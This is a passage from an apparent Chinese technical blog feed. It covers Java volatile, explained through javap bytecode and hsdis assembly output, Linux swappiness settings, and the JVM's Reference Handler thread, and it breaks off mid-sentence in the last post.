volatile Foo$Helper helper;</span><br><span class="line">    descriptor: LFoo$Helper;</span><br><span class="line">    flags: ACC_PRIVATE, ACC_VOLATILE</span><br><span class="line"></span><br><span class="line">  Foo();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags:</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: aload_0</span><br><span class="line">         5: aconst_null</span><br><span class="line">         6: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         9: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 1: 0</span><br><span class="line">        line 2: 4</span><br><span class="line"></span><br><span class="line">  public Foo$Helper getHelper();</span><br><span class="line">    descriptor: ()LFoo$Helper;</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=4, locals=3, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         4: ifnonnull     40</span><br><span class="line">         7: aload_0</span><br><span class="line">         8: dup</span><br><span class="line">         9: astore_1</span><br><span class="line">        10: monitorenter</span><br><span class="line">        11: aload_0</span><br><span class="line">        12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        15: ifnonnull     30</span><br><span class="line">        18: aload_0</span><br><span class="line">        19: new           #3                  // class Foo$Helper</span><br><span class="line">        22: dup</span><br><span class="line">        23: aload_0</span><br><span class="line">        24: invokespecial #4                  // Method Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">        27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        30: aload_1</span><br><span class="line">        31: monitorexit</span><br><span class="line">        32: goto          40</span><br><span class="line">        35: astore_2</span><br><span class="line">        36: aload_1</span><br><span class="line">        37: monitorexit</span><br><span class="line">        38: aload_2</span><br><span class="line">        39: athrow</span><br><span class="line">        40: aload_0</span><br><span class="line">        41: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        44: areturn</span><br><span class="line">      Exception table:</span><br><span class="line">         from    to  target type</span><br><span class="line">            11    32    35   any</span><br><span class="line">            35    38    35   any</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 4: 0</span><br><span class="line">        line 5: 7</span><br><span class="line">        line 6: 11</span><br><span class="line">        line 7: 18</span><br><span class="line">        line 9: 30</span><br><span class="line">        line 11: 40</span><br><span class="line">      StackMapTable: number_of_entries = 3</span><br><span class="line">        frame_type = 252 /* append */</span><br><span class="line">          offset_delta = 30</span><br><span class="line">          locals = [ class java/lang/Object ]</span><br><span class="line">        frame_type = 68 /* same_locals_1_stack_item */</span><br><span class="line">          stack = [ class java/lang/Throwable ]</span><br><span class="line">        frame_type = 250 /* chop */</span><br><span class="line">          offset_delta = 4</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Foo.java&quot;</span><br><span class="line">InnerClasses:</span><br><span class="line">     #7= #3 of #5; //Helper=class Foo$Helper of class Foo</span><br></pre></td></tr></table></figure><p>去掉<code>volatile</code>关键字, 后对比生成的字节码:</p><img src="/2018/07/08/volatile/diff.png" title="两次生成字节码的diff"><p>可见只是多了一个访问的表示<code>ACC_VOLATILE</code></p><p>从<code>The Java® Virtual Machine Specification</code>中可以找到如下的说明:</p><blockquote><p>ACC_VOLATILE 0x0040 Declared volatile; cannot be cached;</p></blockquote><p>既然字节码层面找不到太多的蛛丝马迹, 我们来看看汇编的代码</p><h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p>要查看汇编代码需要用到一个叫做<code>hsdis</code>(A HotSpot plugin for disassembling dynamically generated code.)的工具, 这个工具可以自己下载<code>openjdk</code>的代码编译, 也可以下载别人已经编译好的.</p><p><code>openjdk</code>中对应的源码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  jvm  locate hsdis         </span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/Makefile</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/README</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis-demo.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.h</span><br></pre></td></tr></table></figure><p>编译时需要下载<code>binutils-2.19.1</code>, 编译命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  hsdis  ls</span><br><span class="line">binutils-2.19.1  binutils-2.19.1.tar.bz2  build  hsdis.c  hsdis-demo.c  hsdis.h  Makefile  README</span><br><span class="line">➜  hsdis  sudo make BINUTILS=binutils-2.19.1 ARCH=amd64</span><br></pre></td></tr></table></figure><p>不过<code>binutils</code>的编译配置中, 如果用的是gcc编译会把所有的warning当作error, 可以看到config.log的输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1: all warnings being treated as errors</span><br></pre></td></tr></table></figure></p><p>强行替换<code>-Werror</code>为’’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &quot;包含-Werror的文件&quot; | xargs -I&#123;&#125; sudo sed -i &quot;s#-Werror##g&quot; &#123;&#125;</span><br></pre></td></tr></table></figure><p>再编译就好了!</p><p>至于安装, 他的<code>README</code>中已经说的很清楚了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* Installing</span><br><span class="line"></span><br><span class="line">Products are named like build/$OS-$LIBARCH/hsdis-$LIBARCH.so.  You can</span><br><span class="line">install them on your LD_LIBRARY_PATH, or inside of your JRE/JDK.  The</span><br><span class="line">search path in the JVM is:</span><br><span class="line"></span><br><span class="line">1. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/libhsdis-&lt;arch&gt;.so</span><br><span class="line">2. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">3. &lt;home&gt;/jre/lib/&lt;arch&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">4. hsdis-&lt;arch&gt;.so  (using LD_LIBRARY_PATH)</span><br><span class="line"></span><br><span class="line">Note that there&apos;s a bug in hotspot versions prior to hs22 that causes</span><br><span class="line">steps 2 and 3 to fail when used with JDK7.</span><br><span class="line"></span><br><span class="line">Now test:</span><br><span class="line"></span><br><span class="line">  export LD_LIBRARY_PATH .../hsdis/build/$OS-$LIBARCH:$LD_LIBRARY_PATH</span><br><span class="line">  dargs=&apos;-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly&apos;</span><br><span class="line">  dargs=$dargs&apos; -XX:PrintAssemblyOptions=hsdis-print-bytes&apos;</span><br><span class="line">  java $dargs -Xbatch CompileCommand=print,*String.hashCode HelloWorld</span><br><span class="line"></span><br><span class="line">If the product mode of the JVM does not accept -XX:+PrintAssembly,</span><br><span class="line">you do not have a version new enough to use the hsdis plugin.</span><br></pre></td></tr></table></figure><p>安装就是放到jvm能够加载到的路径上, 然后在jvm的启动参数中加入<code>-XX:+PrintAssembly -Xcomp</code></p><blockquote><p>参数-Xcomp是让虚拟机以编译模式执行代码，这样代码可以偷懒，不需要执行足够次数来预热都能触发JIT编译。</p></blockquote><p>可以看到输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 0x00007f29294c0054: mov    %r12d,0xc(%rbp)</span><br><span class="line"> 0x00007f29294c0058: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::&lt;init&gt;@6 (line 40)</span><br><span class="line">//...</span><br><span class="line"> 0x00007f2929504fdc: shr    $0x9,%rax</span><br><span class="line"> 0x00007f2929504fe0: mov    $0x7f2924e3f000,%rdi</span><br><span class="line"> 0x00007f2929504fea: movb   $0x0,(%rax,%rdi,1)</span><br><span class="line"> 0x00007f2929504fee: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::getHelper@27 (line 45)</span><br></pre></td></tr></table></figure><p>可以看到多出了一行 “lock addl $0x0,(%rsp)”，这行代码只是对 stack pointer 加 0，无含义。<br>但 LOCK prefix 的指令会触发处理器做特殊的操作，查看 Intel 64 and IA-32 架构开发手册的相关资料：</p><p>“Synchronization mechanisms in multiple-processor systems may depend upon a strong memory-ordering model. Here, a program can use a locking instruction such as the XCHG instruction or the LOCK prefix to ensure that a read-modify-write operation on memory is carried out atomically. Locking operations typically operate like I/O operations in that they wait for all previous instructions to complete and for all buffered writes to drain to memory.”</p><p>LOCK prefix 会触发 CPU 缓存回写到内存，而后通过 CPU 缓存一致性机制，使得其它线程能够看到最新的共享变量，实现了共享变量对于所有 CPU 的可见性。</p><img src="/2018/07/08/volatile/cpu-cache.jpg"><h3 id="new-Test-做了什么"><a href="#new-Test-做了什么" class="headerlink" title="new Test()做了什么"></a><code>new Test()</code>做了什么</h3><p>参考R大在知乎上的解答:</p><blockquote><p><code>new Test()</code><br>这个表达式的作用是：</p><ol><li>创建并默认初始化一个Test类型的对象</li><li>调用Test类的signature为 <init>()V 的构造器</init></li><li>表达式的值为一个指向这个新建对家的引用。</li></ol></blockquote><p>对应到上面的字节码, 我们从同步块的<code>monitorenter</code>和<code>monitorexit</code>找到<code>new</code>对应的字节码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>: monitorenter</span><br><span class="line"><span class="number">11</span>: aload_0</span><br><span class="line">12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">15</span>: ifnonnull     <span class="number">30</span></span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">18</span>: aload_0</span><br><span class="line">19: new           #3                  // class Foo$Helper</span><br><span class="line"><span class="number">22</span>: dup</span><br><span class="line"><span class="number">23</span>: aload_0</span><br><span class="line">24: invokespecial #4                  // Method Foo$Helper."&lt;init&gt;":(LFoo;)V</span><br><span class="line">27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">30</span>: aload_1</span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">31</span>: monitorexit</span><br></pre></td></tr></table></figure><p>稍微补充下字节码的指令知识:</p><blockquote><p>aload_0 获取的是本地变量表中对象的引用，a代表引用类型，0表示本地表量表中变量的索引，通常0这个位置的引用，一般都是 this 对象。iload_0 获取的是 下标为 0 的整数类型。<br>invokespecial会消耗掉操作数栈顶的引用作为传给构造器的“this”参数，所以如果我们希望在invokespecial调用后在操作数栈顶还维持有一个指向新建对象的引用，就得在invokespecial之前先“复制”一份引用——这就是这个dup的来源<br>可以看到，new字节码指令的作用是, 创建指定类型的对象实例、对其进行默认初始化，并且将指向该实例的一个引用压入操作数栈顶；</p></blockquote><p>因为<code>new</code>操作并不是一个原子的操作, 他是分了三步的, 如果没有volatile, 这里就有可能发生重排序, 导致另外的线程拿到的是一个初始化了一半的对象.</p><h2 id="JMM规范"><a href="#JMM规范" class="headerlink" title="JMM规范"></a>JMM规范</h2><p><code>JMM</code>(JSR-133)规定了每个线程都有一个工作内存, </p><blockquote><p>Every thread is defined to have a working memory (an abstraction of caches and registers) in which to store values.<br>线程的工作内存, 理解为cpu的cache或者register就行了. </p></blockquote><img src="/2018/07/08/volatile/cache.gif" title="cpu的cache"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/" rel="external nofollow noopener noreferrer" target="_blank">The Java Memory Model</a></li><li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/CommunityReview.pdf" rel="external nofollow noopener noreferrer" target="_blank">JSR-133</a></li><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html" rel="external nofollow noopener noreferrer" target="_blank">The “Double-Checked Locking is Broken” Declaration</a></li><li><a href="https://www.zhihu.com/question/52749416" rel="external nofollow noopener noreferrer" target="_blank">关于JVM字节码中dup指令的问题？ - 知乎</a></li><li><a href="https://tech.meituan.com/java-memory-reordering.html" rel="external nofollow noopener noreferrer" target="_blank">Java内存访问重排序的研究 -</a></li><li><a href="https://blog.csdn.net/Marvel__Dead/article/details/75193914" rel="external nofollow noopener noreferrer" target="_blank">字节码指令级别从i++说到volatile，深入理解i++的线程安全问题 - CSDN博客</a></li><li><a href="https://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly" rel="external nofollow noopener noreferrer" target="_blank">c++ - What does the “lock” instruction mean in x86 assembly? - Stack Overflow</a></li><li><a href="https://stackoverflow.com/questions/19652824/why-can-memorybarrier-be-implemented-as-a-call-to-xchg" rel="external nofollow noopener noreferrer" target="_blank">windows - why can MemoryBarrier be implemented as a call to xchg? - Stack Overflow</a></li><li><a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html" rel="external nofollow noopener noreferrer" target="_blank">Intel® 64 and IA-32 Architectures Developer’s Manual: Vol. 3A</a></li><li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li><li><a href="http://www.cnblogs.com/dolphin0520/p/3920373.html" rel="external nofollow noopener noreferrer" target="_blank">Java并发编程：volatile关键字解析 - 海 子 - 博客园</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h2&gt;&lt;p&gt;volatile的作用:&lt;/p&gt;
&lt;p&gt;1.保证多个线程”同时”修改”共享”变量时不会因为cpu cache等原因而造成不一致,  &lt;/p&gt;
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="volatile" scheme="http://qsli.github.io/tags/volatile/"/>
    
  </entry>
  
  <entry>
    <title>swappiness</title>
    <link href="http://qsli.github.io/2018/07/08/swap/"/>
    <id>http://qsli.github.io/2018/07/08/swap/</id>
    <published>2018-07-08T07:56:57.000Z</published>
    <updated>2018-08-11T12:42:42.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sysctl中和swap相关的参数"><a href="#sysctl中和swap相关的参数" class="headerlink" title="sysctl中和swap相关的参数"></a>sysctl中和swap相关的参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo sysctl -a  | grep swap</span><br><span class="line">vm.swappiness = 0</span><br></pre></td></tr></table></figure><blockquote><p>Swappiness is a Linux kernel parameter that controls the relative weight given to swapping out of runtime memory, as opposed to dropping pages from the system page cache. Swappiness can be set to values between 0 and 100 inclusive. A low value causes the kernel to avoid swapping; a higher value causes the kernel to try to use swap space.<br>取值说明:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness = 0，表示只有在避免OOM的时候才进行swap操作；(并不是关闭swap)</span><br><span class="line">vm.swappiness = 60，系统默认值；</span><br><span class="line">vm.swappiness = 100，系统主动的进行swap操作。</span><br></pre></td></tr></table></figure><h2 id="关闭swap"><a href="#关闭swap" class="headerlink" title="关闭swap"></a>关闭swap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br><span class="line">sudo echo 0 | sudo tee /proc/sys/vm/swappiness</span><br><span class="line">sudo swapoff/swapon -a</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDcyMTQyNQ==&amp;mid=206046053&amp;idx=1&amp;sn=76f7a31003d80c3089c3a266e4b139e0&amp;3rd=MzA3MDU4NTYzMw==&amp;scene=6#rd" rel="external nofollow noopener noreferrer" target="_blank">Qunar技术沙龙</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sysctl中和swap相关的参数&quot;&gt;&lt;a href=&quot;#sysctl中和swap相关的参数&quot; class=&quot;headerlink&quot; title=&quot;sysctl中和swap相关的参数&quot;&gt;&lt;/a&gt;sysctl中和swap相关的参数&lt;/h2&gt;&lt;figure class
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="swap" scheme="http://qsli.github.io/tags/swap/"/>
    
  </entry>
  
  <entry>
    <title>java中的引用</title>
    <link href="http://qsli.github.io/2018/07/08/reference/"/>
    <id>http://qsli.github.io/2018/07/08/reference/</id>
    <published>2018-07-07T18:03:55.000Z</published>
    <updated>2018-08-11T12:42:42.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jvm中的Reference-Handler线程"><a href="#jvm中的Reference-Handler线程" class="headerlink" title="jvm中的Reference Handler线程"></a>jvm中的<code>Reference Handler</code>线程</h2><p>经常看<code>jstack</code>的输出就会发现一个常见的线程 – <code>Reference Handler</code>, 堆栈如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;Reference Handler&quot; #2 daemon prio=10 os_prio=0 tid=0x00007f873013e000 nid=0x18d7 in Object.wait() [0x00007f873443b000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">at java.lang.Object.wait(Native Method)</span><br><span class="line">at java.lang.Object.wait(Object.java:502)</span><br><span class="line">at java.lang.ref.Reference.tryHandlePending(Reference.java:191)</span><br><span class="line">- locked &lt;0x00000000e0e1e9b8&gt; (a java.lang.ref.Reference$Lock)</span><br><span class="line">at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)</span><br><span class="line"></span><br><span class="line">&quot;VM Thread&quot; os_prio=0 tid=0x00007f8730136800 nid=0x18d6 runnable</span><br></pre></td></tr></table></figure><p>看线程栈, 执行到<code>Reference</code>下的<code>tryHandlePending</code>方法就成了<code>WAIT</code>状态, 带着好奇心去翻翻源码.</p><h3 id="何时启动"><a href="#何时启动" class="headerlink" title="何时启动?"></a>何时启动?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reference类中的静态代码块</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line">        ThreadGroup tg = Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">for</span> (ThreadGroup tgn = tg;</span><br><span class="line">             tgn != <span class="keyword">null</span>;</span><br><span class="line">             tg = tgn, tgn = tg.getParent());</span><br><span class="line">        <span class="comment">// 这里创建线程, 传入线程group和线程的名称, 堆栈中的名称就来自于此</span></span><br><span class="line">        Thread handler = <span class="keyword">new</span> ReferenceHandler(tg, <span class="string">"Reference Handler"</span>);</span><br><span class="line">        <span class="comment">/* If there were a special system-only priority greater than</span></span><br><span class="line"><span class="comment">         * MAX_PRIORITY, it would be used here</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        handler.setPriority(Thread.MAX_PRIORITY);</span><br><span class="line">        handler.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        handler.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// provide access in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaLangRefAccess(<span class="keyword">new</span> JavaLangRefAccess() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryHandlePendingReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> tryHandlePending(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Reference</code>在被加载的时候就会触发<code>static</code>里的代码执行, 就会创建<code>Reference Handler</code>线程并启动.<br>至于<code>SharedSecrets</code>, 这个类类似一个Holder, 保存了一些对象的引用, 并提供了一些get/set方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SharedSecrets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe unsafe = Unsafe.getUnsafe();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilJarAccess javaUtilJarAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangAccess javaLangAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangRefAccess javaLangRefAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOAccess javaIOAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetAccess javaNetAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetHttpCookieAccess javaNetHttpCookieAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNioAccess javaNioAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOFileDescriptorAccess javaIOFileDescriptorAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityProtectionDomainAccess javaSecurityProtectionDomainAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityAccess javaSecurityAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilZipFileAccess javaUtilZipFileAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaAWTAccess javaAWTAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaObjectInputStreamAccess javaObjectInputStreamAccess;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SharedSecrets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getter和setter方法省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="这个线程做了什么"><a href="#这个线程做了什么" class="headerlink" title="这个线程做了什么?"></a>这个线程做了什么?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.lang.ref.Reference.ReferenceHandler</span></span><br><span class="line">  <span class="comment">/* High-priority thread to enqueue pending References</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceHandler</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 采用反射的方式触发类的加载</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(clazz.getName(), <span class="keyword">true</span>, clazz.getClassLoader());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (Error) <span class="keyword">new</span> NoClassDefFoundError(e.getMessage()).initCause(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="comment">// pre-load and initialize InterruptedException and Cleaner classes</span></span><br><span class="line">            <span class="comment">// so that we don't get into trouble later in the run loop if there's</span></span><br><span class="line">            <span class="comment">// memory shortage while loading/initializing them lazily.</span></span><br><span class="line">            ensureClassInitialized(InterruptedException.class);</span><br><span class="line">            <span class="comment">// 和DirectMemory相关的Cleaner类</span></span><br><span class="line">            ensureClassInitialized(Cleaner.class);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceHandler(ThreadGroup g, String name) &#123;</span><br><span class="line">            <span class="keyword">super</span>(g, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">// 调用Reference类的方法</span></span><br><span class="line">                tryHandlePending(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个线程其实只是在死循环中调用了<code>Reference</code>的<code>tryHandlePending</code>来清理无效的<code>Reference</code>.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Java中有四种引用, <code>StrongReference</code>, <code>SoftReference</code>, <code>WeakReference</code>, <code>PhantomReference</code>, 除了<code>StrongReference</code>其他的三种都有对应的类:</p><img src="/2018/07/08/reference/reference.jpg" title="Reference"><h3 id="引用的状态"><a href="#引用的状态" class="headerlink" title="引用的状态"></a>引用的状态</h3><ul><li><code>Active</code>: Newly-created instances are Active.</li><li><code>Pending</code>: An element of the pending-Reference list, waiting to be enqueued by the Reference-handler thread.  Unregistered instances are never in this state.(没有注册ReferenceQueue的不会有这个状态)</li><li><code>Enqueued</code>: An element of the queue with which the instance was registered when it was created. 